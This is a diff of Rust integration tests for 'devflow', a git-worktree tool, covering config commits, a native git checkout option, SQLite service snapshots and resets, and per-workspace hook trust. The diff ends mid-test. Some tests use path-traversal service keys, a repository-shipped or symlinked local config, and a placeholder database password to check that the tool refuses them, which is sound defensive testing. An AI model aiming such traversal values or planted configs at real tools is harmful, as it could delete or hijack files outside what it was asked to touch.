@@ -89,17 +89,46 @@ impl Env {
         let mut text = std::fs::read_to_string(self.config_path()).unwrap();
         text.push_str("\n[hooks]\nsetup = []\nteardown = []\n");
         std::fs::write(self.config_path(), text).unwrap();
+        // A workspace runs the recipes of its own branch, so the file is
+        // committed, as a person does after reviewing what `init` wrote.
+        self.commit_config(&self.repo);
     }
 
     fn config_path(&self) -> PathBuf {
         self.repo.join("devflow.toml")
     }
 
-    /// Replace `from` in `devflow.toml` (a line the generated file contains).
+    /// Commit `devflow.toml` in the checkout at `dir`.
+    fn commit_config(&self, dir: &Path) {
+        let git = git2::Repository::open(dir).unwrap();
+        let mut index = git.index().unwrap();
+        index.add_path(Path::new("devflow.toml")).unwrap();
+        index.write().unwrap();
+        let tree = git.find_tree(index.write_tree().unwrap()).unwrap();
+        let parent = git.head().unwrap().peel_to_commit().unwrap();
+        let sig = git2::Signature::now("Test", "test@example.com").unwrap();
+        git.commit(Some("HEAD"), &sig, &sig, "devflow.toml", &tree, &[&parent])
+            .unwrap();
+    }
+
+    /// Replace `from` in `devflow.toml` (a line the generated file contains),
+    /// in the main checkout and in every worktree made so far, as if the
+    /// change had been committed on every branch.
     fn edit_config(&self, from: &str, to: &str) {
         let text = std::fs::read_to_string(self.config_path()).unwrap();
         assert!(text.contains(from), "{from:?} not in:\n{text}");
-        std::fs::write(self.config_path(), text.replace(from, to)).unwrap();
+        let mut dirs = vec![self.repo.clone()];
+        if let Ok(entries) = std::fs::read_dir(self.root.join("repo.worktrees")) {
+            dirs.extend(entries.flatten().map(|entry| entry.path()));
+        }
+        for dir in dirs {
+            let path = dir.join("devflow.toml");
+            let Ok(text) = std::fs::read_to_string(&path) else {
+                continue;
+            };
+            std::fs::write(&path, text.replace(from, to)).unwrap();
+            self.commit_config(&dir);
+        }
     }
 
     /// A directory holding an executable `name` that runs `script` with
@@ -975,6 +1004,37 @@ fn json_is_rejected_for_commands_that_cannot_emit_it() {
 }
 
 #[test]
+fn config_schema_prints_the_committed_schemas_outside_any_project() {
+    // Not in a project: the schema is the same everywhere. It is JSON already,
+    // so `--json` neither wraps it nor changes it, and nothing else is printed.
+    let env = Env::new();
+    let docs = Path::new(env!("CARGO_MANIFEST_DIR")).join("docs");
+    for (args, file) in [
+        (["config", "schema"].as_slice(), "devflow.schema.json"),
+        (
+            ["--json", "config", "schema"].as_slice(),
+            "devflow.schema.json",
+        ),
+        (
+            ["config", "schema", "--local"].as_slice(),
+            "devflow.local.schema.json",
+        ),
+    ] {
+        let out = env.run(args);
+        ok(&out);
+        assert_eq!(
+            String::from_utf8_lossy(&out.stdout),
+            std::fs::read_to_string(docs.join(file)).unwrap(),
+            "{args:?}"
+        );
+        assert!(out.stderr.is_empty(), "{args:?}: {}", describe(&out));
+        let doc = json(&out);
+        assert_eq!(doc["$schema"], "http://json-schema.org/draft-07/schema#");
+        assert!(doc.get("version").is_none() && doc.get("command").is_none());
+    }
+}
+
+#[test]
 fn completions_cover_the_binary() {
     let env = Env::new();
     for shell in ["bash", "zsh", "fish"] {
@@ -1499,6 +1559,512 @@ fn switch_create_list_path_and_remove_without_postgres() {
     assert_eq!(doc["workspaces"].as_array().unwrap().len(), 1);
 }
 
+fn git_works() -> bool {
+    Command::new("git")
+        .arg("--version")
+        .output()
+        .map(|out| out.status.success())
+        .unwrap_or(false)
+}
+
+/// `[worktree] checkout = "git"` in the machine-local file.
+fn choose_native_checkout(env: &Env) {
+    std::fs::write(
+        env.repo.join("devflow.local.toml"),
+        "[worktree]\ncheckout = \"git\"\n",
+    )
+    .unwrap();
+}
+
+#[test]
+fn the_native_checkout_is_a_local_choice_reported_in_the_result() {
+    if !git_works() {
+        eprintln!("skipped: no git on PATH");
+        return;
+    }
+    let env = Env::new();
+    env.init();
+
+    // The default backend says so.
+    let doc = json(ok(&env.run(&[
+        "--json",
+        "--non-interactive",
+        "switch",
+        "-c",
+        "by-libgit2",
+    ])));
+    assert_eq!(doc["checkout"]["backend"], "libgit2", "{doc}");
+    assert!(doc["checkout"].get("git").is_none(), "{doc}");
+
+    // A committed file cannot opt anyone in: an error naming the key, and
+    // nothing is created.
+    env.edit_config("[worktree]\n", "[worktree]\ncheckout = \"git\"\n");
+    let out = env.run(&["--json", "--non-interactive", "switch", "-c", "committed"]);
+    failed(&out);
+    let text = describe(&out);
+    assert!(text.contains("worktree.checkout"), "{text}");
+    assert!(text.contains("devflow.local.toml"), "{text}");
+    assert!(
+        !env.repo
+            .parent()
+            .unwrap()
+            .join("repo.worktrees/committed")
+            .exists(),
+        "{text}"
+    );
+    env.edit_config("[worktree]\ncheckout = \"git\"\n", "[worktree]\n");
+
+    // The local file can. The result and the human output say who ran it.
+    choose_native_checkout(&env);
+    let out = env.run(&["--json", "--non-interactive", "switch", "-c", "by-git"]);
+    ok(&out);
+    let doc = json(&out);
+    assert_eq!(doc["status"], "ready", "{doc}");
+    assert_eq!(doc["checkout"]["backend"], "git", "{doc}");
+    assert!(
+        doc["checkout"]["git"]
+            .as_str()
+            .unwrap()
+            .starts_with("git version"),
+        "{doc}"
+    );
+    let path = PathBuf::from(doc["path"].as_str().unwrap());
+    assert!(path.join("README.md").is_file());
+    assert!(
+        doc["receipt"]["phases"]["materialize"]["detail"]
+            .as_str()
+            .unwrap_or_default()
+            .contains("checked out by Git"),
+        "{doc}"
+    );
+    let out = env.run(&["--non-interactive", "switch", "-c", "by-git-too"]);
+    ok(&out);
+    assert!(
+        stderr(&out).contains("checked out by Git"),
+        "{}",
+        describe(&out)
+    );
+}
+
+/// Commit the paths in `names` (relative to the checkout) as a person would
+/// after `git add -f`.
+fn commit_paths(dir: &Path, names: &[&str], message: &str) {
+    let git = git2::Repository::open(dir).unwrap();
+    let mut index = git.index().unwrap();
+    for name in names {
+        index.add_path(Path::new(name)).unwrap();
+    }
+    index.write().unwrap();
+    let tree = git.find_tree(index.write_tree().unwrap()).unwrap();
+    let parent = git.head().unwrap().peel_to_commit().unwrap();
+    let sig = git2::Signature::now("Test", "test@example.com").unwrap();
+    git.commit(Some("HEAD"), &sig, &sig, message, &tree, &[&parent])
+        .unwrap();
+}
+
+fn no_branch(env: &Env, name: &str) -> bool {
+    let git = git2::Repository::open(&env.repo).unwrap();
+    git.find_branch(name, git2::BranchType::Local).is_err()
+}
+
+#[cfg(unix)]
+#[test]
+fn a_local_file_the_repository_ships_or_links_cannot_opt_into_the_native_checkout() {
+    if !git_works() {
+        eprintln!("skipped: no git on PATH");
+        return;
+    }
+    let env = Env::new();
+    env.init();
+    let local = env.repo.join("devflow.local.toml");
+
+    // The repository ships a `devflow.local.toml` that asks for Git.
+    choose_native_checkout(&env);
+    commit_paths(&env.repo, &["devflow.local.toml"], "ship a local file");
+    let out = env.run(&["--json", "--non-interactive", "switch", "-c", "shipped"]);
+    failed(&out);
+    let text = describe(&out);
+    assert!(text.contains("worktree.checkout"), "{text}");
+    assert!(text.contains("tracked by Git"), "{text}");
+    assert!(text.contains(&local.display().to_string()), "{text}");
+    assert!(no_branch(&env, "shipped"), "nothing is created: {text}");
+
+    // It ships a link instead, to a file that is not even in the repository.
+    let git = git2::Repository::open(&env.repo).unwrap();
+    let mut index = git.index().unwrap();
+    index.remove_path(Path::new("devflow.local.toml")).unwrap();
+    index.write().unwrap();
+    commit_paths(&env.repo, &[], "stop shipping it");
+    std::fs::remove_file(&local).unwrap();
+    let elsewhere = env.root.join("somebody-elses.toml");
+    std::fs::write(&elsewhere, "[worktree]\ncheckout = \"git\"\n").unwrap();
+    std::os::unix::fs::symlink(&elsewhere, &local).unwrap();
+    let out = env.run(&["--json", "--non-interactive", "switch", "-c", "linked"]);
+    failed(&out);
+    let text = describe(&out);
+    assert!(text.contains("worktree.checkout"), "{text}");
+    assert!(text.contains("symbolic link"), "{text}");
+    assert!(no_branch(&env, "linked"), "nothing is created: {text}");
+
+    // The person's own regular file, untracked, is what chooses it.
+    std::fs::remove_file(&local).unwrap();
+    choose_native_checkout(&env);
+    let out = env.run(&["--json", "--non-interactive", "switch", "-c", "mine"]);
+    ok(&out);
+    assert_eq!(json(&out)["checkout"]["backend"], "git");
+}
+
+#[cfg(unix)]
+#[test]
+fn an_environment_of_a_workspace_that_cannot_be_resolved_refuses_the_native_checkout() {
+    if !git_works() {
+        eprintln!("skipped: no git on PATH");
+        return;
+    }
+    let env = Env::new();
+    env.init();
+    choose_native_checkout(&env);
+    let stale = |command: &mut Command| {
+        command
+            .env("DEVFLOW_WORKSPACE_PATH", "/gone/elsewhere")
+            .env("DEVFLOW_WORKSPACE_ID", "not-a-real-id")
+            .env("DEVFLOW_WORKSPACE", "elsewhere")
+            .env("DATABASE_URL", "postgres://u:hunter2@elsewhere/db"); // kingfisher:ignore
+    };
+
+    // Which variables are the other workspace's cannot be told, so Git is not
+    // started with them: refused, before anything is created, with the way on.
+    let mut command = env.command(&env.repo);
+    command.args(["--json", "--non-interactive", "switch", "-c", "stale"]);
+    stale(&mut command);
+    let out = command.output().unwrap();
+    failed(&out);
+    let text = describe(&out);
+    assert!(text.contains("elsewhere"), "{text}");
+    assert!(text.contains("cannot be resolved"), "{text}");
+    assert!(text.contains("clear_inherited"), "{text}");
+    assert!(!text.contains("hunter2"), "no value is printed: {text}");
+    assert!(no_branch(&env, "stale"), "nothing is created: {text}");
+    assert!(
+        !env.root.join("repo.worktrees/stale").exists(),
+        "nothing is created: {text}"
+    );
+
+    // Asking to clear them goes on.
+    let mut command = env.command(&env.repo);
+    command
+        .args(["--json", "--non-interactive", "switch", "-c", "cleared"])
+        .env("DEVFLOW_CLEAR_INHERITED", "1");
+    stale(&mut command);
+    let out = command.output().unwrap();
+    ok(&out);
+    assert_eq!(json(&out)["checkout"]["backend"], "git");
+}
+
+#[cfg(unix)]
+#[test]
+fn the_native_checkout_does_not_set_the_worktree_up_a_second_time_through_the_git_hook() {
+    if !git_works() {
+        eprintln!("skipped: no git on PATH");
+        return;
+    }
+    let env = Env::new();
+    env.init();
+    ok(&env.run(&["hook", "install"]));
+    choose_native_checkout(&env);
+    // A `devflow` that only records being called: the hook finds it first.
+    let shim = env.fake_program("devflow", "echo \"$*\" >> \"$FAKE_LOG\"");
+    let path = format!(
+        "{}:{}",
+        shim.dir.display(),
+        std::env::var("PATH").unwrap_or_default()
+    );
+
+    // Control: a worktree somebody else makes does reach the hook.
+    let other = env.root.join("other-worktree");
+    let out = Command::new("git")
+        .args(["worktree", "add", "-q", "-b", "control"])
+        .arg(&other)
+        .current_dir(&env.repo)
+        .env("PATH", &path)
+        .env("FAKE_LOG", &shim.log)
+        .env("HOME", env.root.join("home"))
+        .output()
+        .unwrap();
+    assert!(out.status.success(), "{out:?}");
+    assert_eq!(
+        shim.lines(),
+        ["setup --if-new --from-git-hook"],
+        "the hook is installed and finds the shim"
+    );
+    std::fs::remove_file(&shim.log).unwrap();
+
+    // devflow's own native checkout runs Git with DEVFLOW_SETUP_ACTIVE set,
+    // so the hook stays out of it; the setup that follows is devflow's.
+    let out = env
+        .command(&env.repo)
+        .args(["--json", "--non-interactive", "switch", "-c", "native"])
+        .env("PATH", &path)
+        .env("FAKE_LOG", &shim.log)
+        .output()
+        .unwrap();
+    ok(&out);
+    let doc = json(&out);
+    assert_eq!(doc["status"], "ready", "{doc}");
+    assert_eq!(doc["checkout"]["backend"], "git", "{doc}");
+    assert!(
+        !shim.log.exists(),
+        "the hook set the worktree up again: {:?}",
+        std::fs::read_to_string(&shim.log)
+    );
+}
+
+/// `[services.app]`, a sqlite database at `db/app.sqlite3`, in the config.
+fn with_sqlite(env: &Env) {
+    let mut text = std::fs::read_to_string(env.config_path()).unwrap();
+    text.push_str("\n[services.app]\nengine = \"sqlite\"\npath = \"db/app.sqlite3\"\n");
+    std::fs::write(env.config_path(), text).unwrap();
+    std::fs::write(env.repo.join(".gitignore"), "db/\n.devflow/\n").unwrap();
+}
+
+fn sqlite_rows(path: &Path) -> i64 {
+    rusqlite::Connection::open_with_flags(path, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY)
+        .unwrap()
+        .query_row("SELECT count(*) FROM t", [], |r| r.get(0))
+        .unwrap()
+}
+
+fn make_sqlite(path: &Path, rows: i64) {
+    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
+    let conn = rusqlite::Connection::open(path).unwrap();
+    conn.execute_batch("CREATE TABLE t (n INTEGER PRIMARY KEY)")
+        .unwrap();
+    for n in 1..=rows {
+        conn.execute("INSERT INTO t VALUES (?1)", [n]).unwrap();
+    }
+}
+
+#[test]
+fn forgetting_a_service_by_a_path_or_a_name_nothing_records_removes_nothing() {
+    let env = Env::new();
+    env.init();
+    with_sqlite(&env);
+    // A directory that is nobody's service, named the way a service is.
+    let victim = tempfile::tempdir().unwrap();
+    std::fs::write(victim.path().join("keep.txt"), "mine").unwrap();
+    let absolute = victim.path().to_str().unwrap().to_string();
+    for key in [absolute.as_str(), "..", "../x", "a/b"] {
+        let out = env.run(&["service", key, "forget"]);
+        failed(&out);
+        assert!(
+            stderr(&out).contains("is not a service key") && stderr(&out).contains("nothing"),
+            "{key}: {}",
+            describe(&out)
+        );
+    }
+    assert_eq!(
+        std::fs::read_to_string(victim.path().join("keep.txt")).unwrap(),
+        "mine",
+        "the directory is untouched"
+    );
+    // A well-formed key the catalog does not record: refused as well.
+    let out = env.run(&["service", "ghost", "forget"]);
+    failed(&out);
+    assert!(
+        stderr(&out).contains("records no service named 'ghost'"),
+        "{}",
+        describe(&out)
+    );
+}
+
+#[test]
+fn a_sqlite_service_is_cloned_snapshotted_reset_and_dropped_from_the_command_line() {
+    let env = Env::new();
+    env.init();
+    with_sqlite(&env);
+    let main_db = env.repo.join("db/app.sqlite3");
+    make_sqlite(&main_db, 12);
+
+    let doc = json(ok(&env.run(&[
+        "--json",
+        "--non-interactive",
+        "switch",
+        "-c",
+        "feature/a",
+    ])));
+    assert_eq!(doc["status"], "ready", "{doc}");
+    let path = PathBuf::from(doc["path"].as_str().unwrap());
+    let database = path.join("db/app.sqlite3");
+    assert_eq!(sqlite_rows(&database), 12);
+    let binding = &doc["receipt"]["services"]["app"];
+    assert_eq!(binding["engine"], "sqlite", "{doc}");
+    assert_eq!(binding["source"], "workspace:master");
+    assert_eq!(binding["owned"], true);
+    assert!(binding["cloned"]["method"].is_string(), "{doc}");
+
+    // The workspace's variables: a path and a URL, in the process of anything
+    // started through `devflow exec`.
+    let out = env.run_in(
+        &path,
+        &[
+            "exec",
+            "--",
+            "sh",
+            "-c",
+            "echo \"$SQLITE_PATH|$DATABASE_URL\"",
+        ],
+    );
+    ok(&out);
+    assert_eq!(
+        stdout(&out).trim(),
+        format!("{0}|sqlite://{0}", database.display()),
+        "{}",
+        describe(&out)
+    );
+
+    // Status and list say where each workspace's file is and where it came from.
+    let doc = json(ok(&env.run(&["--json", "service", "app", "status"])));
+    let service = &doc["services"][0];
+    assert_eq!(service["engine"], "sqlite", "{doc}");
+    assert_eq!(service["path"], "db/app.sqlite3");
+    assert!(service["library"].as_str().unwrap().starts_with('3'));
+    let databases = service["databases"].as_array().unwrap();
+    assert_eq!(databases.len(), 2);
+    let feature = databases
+        .iter()
+        .find(|d| d["workspace"] == "feature/a")
+        .unwrap();
+    assert_eq!(feature["source"], "workspace:master");
+    assert_eq!(feature["exists"], true);
+    let human = stdout(&env.run(&["service", "app", "status"]));
+    assert!(human.contains("app (sqlite, db/app.sqlite3)"), "{human}");
+    assert!(
+        human.contains("feature/a") && human.contains("workspace:master"),
+        "{human}"
+    );
+    // Without a name, with no container service, the only sqlite service.
+    ok(&env.run(&["service", "status"]));
+
+    // `url` prints the file's URL; `up` and `down` have nothing to do.
+    let out = env.run(&["service", "app", "url", "feature/a"]);
+    ok(&out);
+    assert_eq!(
+        stdout(&out).trim(),
+        format!("sqlite://{}", database.display())
+    );
+    let doc = json(ok(&env.run(&["--json", "service", "app", "up"])));
+    assert_eq!(doc["engine"], "sqlite", "{doc}");
+    assert!(stdout(&env.run(&["service", "app", "down"])).contains("SQLite file"));
+
+    // Snapshots: taken from a workspace, listed, used as a data source.
+    let doc = json(ok(&env.run(&[
+        "--json", "service", "app", "snapshot", "create", "seed", "--from", "master",
+    ])));
+    assert_eq!(doc["snapshot"]["name"], "seed", "{doc}");
+    assert_eq!(doc["snapshot"]["version"], 1);
+    let doc = json(ok(
+        &env.run(&["--json", "service", "app", "snapshot", "list"])
+    ));
+    assert_eq!(doc["snapshots"].as_array().unwrap().len(), 1);
+    let conn = rusqlite::Connection::open(&main_db).unwrap();
+    conn.execute("INSERT INTO t VALUES (500)", []).unwrap();
+    drop(conn);
+    let doc = json(ok(&env.run(&[
+        "--json",
+        "--non-interactive",
+        "switch",
+        "-c",
+        "seeded",
+        "--data-from",
+        "snapshot:seed",
+    ])));
+    let seeded = PathBuf::from(doc["path"].as_str().unwrap());
+    assert_eq!(sqlite_rows(&seeded.join("db/app.sqlite3")), 12, "{doc}");
+    assert_eq!(
+        doc["receipt"]["services"]["app"]["source"],
+        "snapshot:seed@v1"
+    );
+
+    // Reset: to the snapshot, then to the source it came from.
+    let conn = rusqlite::Connection::open(&database).unwrap();
+    conn.execute("DELETE FROM t", []).unwrap();
+    drop(conn);
+    let doc = json(ok(&env.run(&[
+        "--json",
+        "service",
+        "app",
+        "reset",
+        "feature/a",
+    ])));
+    assert_eq!(doc["reset"]["source"], "workspace:master", "{doc}");
+    assert_eq!(sqlite_rows(&database), 13);
+    let doc = json(ok(&env.run(&[
+        "--json",
+        "service",
+        "app",
+        "reset",
+        "feature/a",
+        "--to",
+        "snapshot:seed",
+    ])));
+    assert_eq!(doc["reset"]["source"], "snapshot:seed@v1", "{doc}");
+    assert_eq!(sqlite_rows(&database), 12);
+    // A branch is not a thing a SQLite database has.
+    let out = env.run(&[
+        "service",
+        "app",
+        "reset",
+        "feature/a",
+        "--to",
+        "branch:0123456789abcdef",
+    ]);
+    failed(&out);
+    assert!(stderr(&out).contains("no branches"), "{}", describe(&out));
+
+    // The default workspace's file is the project's own.
+    let out = env.run(&["service", "app", "reset", "master"]);
+    failed(&out);
+    assert!(
+        stderr(&out).contains("default workspace"),
+        "{}",
+        describe(&out)
+    );
+
+    // Drop by the id the listing shows.
+    let doc = json(ok(&env.run(&["--json", "service", "app", "list"])));
+    let id = doc["services"][0]["databases"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|d| d["workspace"] == "feature/a")
+        .unwrap()["id"]
+        .as_str()
+        .unwrap()
+        .replace('-', "");
+    let doc = json(ok(&env.run(&[
+        "--json",
+        "service",
+        "app",
+        "drop",
+        &id[..8],
+    ])));
+    assert_eq!(doc["workspace"], "feature/a", "{doc}");
+    assert_eq!(doc["removed"], true);
+    assert!(!database.exists());
+    failed(&env.run(&["service", "app", "drop", "--lost", &id[..8]]));
+
+    // Deleting a snapshot, and the one that is not there.
+    ok(&env.run(&["service", "app", "snapshot", "delete", "seed@v1"]));
+    let out = env.run(&["service", "app", "snapshot", "delete", "seed@v1"]);
+    failed(&out);
+    assert!(
+        stderr(&out).contains("no snapshot seed@v1"),
+        "{}",
+        describe(&out)
+    );
+    ok(&env.run(&["service", "app", "reconcile"]));
+}
+
 #[test]
 fn prune_lists_first_forgets_only_what_owns_nothing_and_sends_the_rest_to_remove() {
     let env = Env::new();
@@ -1754,13 +2320,7 @@ fn switching_to_a_missing_workspace_suggests_create() {
 fn untrusted_hooks_need_attention_until_trusted() {
     let env = Env::new();
     env.init();
-    let text = std::fs::read_to_string(env.config_path()).unwrap();
-    assert!(text.contains("setup = []"));
-    std::fs::write(
-        env.config_path(),
-        text.replace("setup = []", "setup = [\"echo ran > hook-ran.txt\"]"),
-    )
-    .unwrap();
+    env.edit_config("setup = []", "setup = [\"echo ran > hook-ran.txt\"]");
 
     // Non-interactive and untrusted: the worktree is kept, hooks do not run, exit 2.
     let out = env.run(&["--json", "--non-interactive", "switch", "-c", "feature/h"]);
@@ -3042,10 +3602,369 @@ fn trust_inside_a_worktree_judges_that_worktrees_own_pitchfork_files() {
         "{doc}"
     );
 
-    // Approving in the worktree approves the worktree's scope.
+    // Approving in the worktree approves the worktree's scope, and does not
+    // revoke the main checkout's: approvals are kept per digest.
     let doc = json(ok(&env.run_in(&worktree, &["--json", "trust", "--yes"])));
     assert_eq!(doc["approved"], true, "{doc}");
     assert_eq!(doc["trust"]["state"], "trusted", "{doc}");
+    assert_eq!(doc["approvals"].as_array().unwrap().len(), 2, "{doc}");
+    let doc = json(ok(&env.run(&["--json", "trust"])));
+    assert_eq!(doc["trust"]["state"], "trusted", "{doc}");
+}
+
+/// Commit `devflow.toml` as it is in the checkout at `dir`.
+fn commit_devflow_toml(dir: &Path) {
+    let git = git2::Repository::open(dir).unwrap();
+    let mut index = git.index().unwrap();
+    index.add_path(Path::new("devflow.toml")).unwrap();
+    index.write().unwrap();
+    let tree = git.find_tree(index.write_tree().unwrap()).unwrap();
+    let parent = git.head().unwrap().peel_to_commit().unwrap();
+    let sig = git2::Signature::now("Test", "test@example.com").unwrap();
+    git.commit(Some("HEAD"), &sig, &sig, "own recipes", &tree, &[&parent])
+        .unwrap();
+}
+
+#[test]
+fn trust_hooks_env_and_doctor_say_which_file_each_part_comes_from() {
+    let env = Env::new();
+    env.init();
+    let out = env.run(&["--json", "--non-interactive", "switch", "-c", "feature/own"]);
+    ok(&out);
+    let worktree = PathBuf::from(json(&out)["path"].as_str().unwrap());
+    let own_file = worktree.join("devflow.toml");
+    let main_file = env.repo.join("devflow.toml");
+
+    // The branch carries its own hooks.
+    let text = std::fs::read_to_string(&own_file).unwrap();
+    std::fs::write(
+        &own_file,
+        text.replace(
+            "setup = []",
+            "setup = [\"echo own\"]\nswitch = [\"echo in\"]",
+        ),
+    )
+    .unwrap();
+    commit_devflow_toml(&worktree);
+
+    // `hooks list` and `env list` name the file the workspace takes them from.
+    let doc = json(ok(&env.run_in(&worktree, &["--json", "hooks", "list"])));
+    assert_eq!(doc["files"]["recipes"]["source"], "workspace", "{doc}");
+    assert_eq!(
+        doc["files"]["recipes"]["file"],
+        own_file.to_str().unwrap(),
+        "{doc}"
+    );
+    assert_eq!(doc["files"]["project"]["path"], own_file.to_str().unwrap());
+    assert_eq!(
+        doc["phases"]["setup"]["hooks"][0]["run"], "echo own",
+        "{doc}"
+    );
+    let doc = json(ok(&env.run(&["--json", "hooks", "list"])));
+    assert_eq!(doc["files"]["recipes"]["source"], "main", "{doc}");
+    assert!(
+        doc["phases"]["setup"]["hooks"]
+            .as_array()
+            .unwrap()
+            .is_empty(),
+        "the main checkout's hooks are its own: {doc}"
+    );
+    // `--workspace` targets another workspace from anywhere.
+    let doc = json(ok(&env.run(&[
+        "--json",
+        "hooks",
+        "list",
+        "--workspace",
+        "feature/own",
+    ])));
+    assert_eq!(doc["files"]["recipes"]["source"], "workspace", "{doc}");
+    let text = stdout(ok(&env.run_in(&worktree, &["hooks", "list"])));
+    assert!(
+        text.contains("this workspace's own") && text.contains("devflow.toml"),
+        "{text}"
+    );
+    let doc = json(ok(&env.run_in(&worktree, &["--json", "env", "list"])));
+    assert_eq!(doc["files"]["recipes"]["source"], "workspace", "{doc}");
+    assert_eq!(doc["path"], worktree.to_str().unwrap(), "{doc}");
+    let text = stdout(ok(&env.run_in(&worktree, &["env", "list"])));
+    assert!(text.contains("from this workspace's own"), "{text}");
+
+    // An edit goes to the file the workspace takes the section from, and says so.
+    let main_before = std::fs::read_to_string(&main_file).unwrap();
+    let doc = json(ok(&env.run_in(
+        &worktree,
+        &["--json", "hooks", "add", "setup", "echo second"],
+    )));
+    assert_eq!(doc["path"], own_file.to_str().unwrap(), "{doc}");
+    assert_eq!(doc["recipes"]["source"], "workspace", "{doc}");
+    assert!(
+        std::fs::read_to_string(&own_file)
+            .unwrap()
+            .contains("echo second")
+    );
+    assert_eq!(std::fs::read_to_string(&main_file).unwrap(), main_before);
+    let out = env.run_in(&worktree, &["env", "set", "GREETING", "hello"]);
+    ok(&out);
+    assert!(
+        stdout(&out).contains(&worktree.display().to_string()),
+        "the human line names the file: {}",
+        describe(&out)
+    );
+    assert!(
+        std::fs::read_to_string(&own_file)
+            .unwrap()
+            .contains("GREETING")
+    );
+    assert!(
+        !std::fs::read_to_string(&main_file)
+            .unwrap()
+            .contains("GREETING")
+    );
+    // The main checkout's own edit goes to its file.
+    let doc = json(ok(&env.run(&[
+        "--json",
+        "hooks",
+        "add",
+        "setup",
+        "echo main",
+    ])));
+    assert_eq!(doc["path"], main_file.to_str().unwrap(), "{doc}");
+
+    // `trust` shows the same, and approvals are per digest.
+    let doc = json(ok(&env.run_in(&worktree, &["--json", "trust"])));
+    assert_eq!(doc["recipes"]["source"], "workspace", "{doc}");
+    assert_eq!(doc["recipes"]["file"], own_file.to_str().unwrap(), "{doc}");
+    assert_eq!(
+        doc["recipes"]["shared"],
+        main_file.to_str().unwrap(),
+        "{doc}"
+    );
+    let text = stdout(ok(&env.run_in(&worktree, &["trust"])));
+    assert!(
+        text.contains("hooks and [env] come from this workspace's own"),
+        "{text}"
+    );
+    ok(&env.run_in(&worktree, &["--json", "trust", "--yes"]));
+    ok(&env.run(&["--json", "trust", "--yes"]));
+    for dir in [&worktree, &env.repo] {
+        let doc = json(ok(&env.run_in(dir, &["--json", "trust"])));
+        assert_eq!(doc["trust"]["state"], "trusted", "{doc}");
+        assert_eq!(doc["approvals"].as_array().unwrap().len(), 2, "{doc}");
+    }
+
+    // `--revoke` withdraws this workspace's scope only; `--revoke-all` the project's.
+    let doc = json(ok(&env.run_in(&worktree, &["--json", "trust", "--revoke"])));
+    assert_eq!(doc["revoked"], true, "{doc}");
+    assert_eq!(
+        json(ok(&env.run(&["--json", "trust"])))["trust"]["state"],
+        "trusted"
+    );
+    assert_eq!(
+        json(ok(&env.run_in(&worktree, &["--json", "trust"])))["trust"]["state"],
+        "untrusted"
+    );
+    let doc = json(ok(&env.run(&["--json", "trust", "--revoke-all"])));
+    assert_eq!(doc["revoked"], true, "{doc}");
+    assert_eq!(doc["revoked_count"], 1, "{doc}");
+    assert_eq!(
+        json(ok(&env.run(&["--json", "trust"])))["trust"]["state"],
+        "untrusted"
+    );
+
+    // `doctor` names where the recipes of the workspace it ran in come from.
+    let doc = json(&env.run_in(&worktree, &["--json", "doctor"]));
+    let recipes = doc["checks"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|check| check["name"] == "recipes")
+        .unwrap_or_else(|| panic!("no recipes check: {doc}"));
+    assert_eq!(recipes["status"], "ok", "{recipes}");
+    let detail = recipes["detail"].as_str().unwrap();
+    assert!(
+        detail.contains("this workspace's own") && detail.contains(own_file.to_str().unwrap()),
+        "{detail}"
+    );
+}
+
+#[test]
+fn a_first_workspace_made_before_devflow_toml_is_committed_says_so() {
+    let env = Env::new();
+    // `init` wrote the file; nobody committed it yet.
+    ok(&env.run(&["init", "--yes", "--name", "shop"]));
+    let out = env.run(&["--json", "--non-interactive", "switch", "-c", "early"]);
+    assert_eq!(out.status.code(), Some(2), "{}", describe(&out));
+    let doc = json(&out);
+    assert_eq!(doc["recipes"]["source"], "unavailable", "{doc}");
+    assert_eq!(doc["recipes"]["because"]["kind"], "not_committed", "{doc}");
+    let message = doc["recipes"]["because"]["message"].as_str().unwrap();
+    assert!(
+        message.contains("start point")
+            && message.contains("has no devflow.toml")
+            && message.contains("not committed"),
+        "{message}"
+    );
+    // The choice first, then the file to commit.
+    let kinds: Vec<&str> = doc["remedies"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|r| r["kind"].as_str().unwrap())
+        .collect();
+    assert_eq!(kinds, ["use_default_recipes", "open_file"], "{doc}");
+    assert_eq!(
+        doc["remedies"][1]["path"],
+        env.config_path().to_str().unwrap(),
+        "{doc}"
+    );
+    // Human output says the same and shows both hints.
+    let out = env.run(&["--non-interactive", "switch", "-c", "early2"]);
+    assert_eq!(out.status.code(), Some(2), "{}", describe(&out));
+    let text = stderr(&out);
+    assert!(
+        text.contains("not committed")
+            && text.contains("--use-default-recipes")
+            && text.contains(&format!("fix {}", env.config_path().display())),
+        "{text}"
+    );
+    assert!(!text.contains("run setup again"), "{text}");
+}
+
+#[test]
+fn a_branch_without_devflow_toml_needs_a_choice_and_the_flag_makes_it() {
+    let env = Env::new();
+    env.init();
+    // The branch starts where devflow.toml did not exist yet.
+    let git = git2::Repository::open(&env.repo).unwrap();
+    let before = git
+        .head()
+        .unwrap()
+        .peel_to_commit()
+        .unwrap()
+        .parent(0)
+        .unwrap()
+        .id()
+        .to_string();
+    let out = env.run(&[
+        "--json",
+        "--non-interactive",
+        "switch",
+        "-c",
+        "old",
+        "--base",
+        &before,
+    ]);
+    assert_eq!(out.status.code(), Some(2), "{}", describe(&out));
+    let doc = json(&out);
+    assert_eq!(doc["status"], "needs_attention", "{doc}");
+    assert_eq!(doc["recipes"]["source"], "unavailable", "{doc}");
+    assert_eq!(doc["recipes"]["because"]["kind"], "missing", "{doc}");
+    let path = PathBuf::from(doc["path"].as_str().unwrap());
+    assert!(!path.join("devflow.toml").exists());
+    // The remedy is typed data, with the CLI line that makes the same choice.
+    let remedy = doc["remedies"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|r| r["kind"] == "use_default_recipes")
+        .unwrap_or_else(|| panic!("{doc}"));
+    assert_eq!(remedy["workspace"], path.to_str().unwrap());
+    assert_eq!(remedy["command"], "devflow setup --use-default-recipes");
+    for message in doc["warnings"].as_array().unwrap() {
+        assert!(!message.as_str().unwrap().contains("`devflow"), "{doc}");
+    }
+
+    // Human output: the hint, never a silent borrow.
+    let out = env.run(&[
+        "--non-interactive",
+        "switch",
+        "-c",
+        "old2",
+        "--base",
+        &before,
+    ]);
+    assert_eq!(out.status.code(), Some(2), "{}", describe(&out));
+    let text = stderr(&out);
+    assert!(
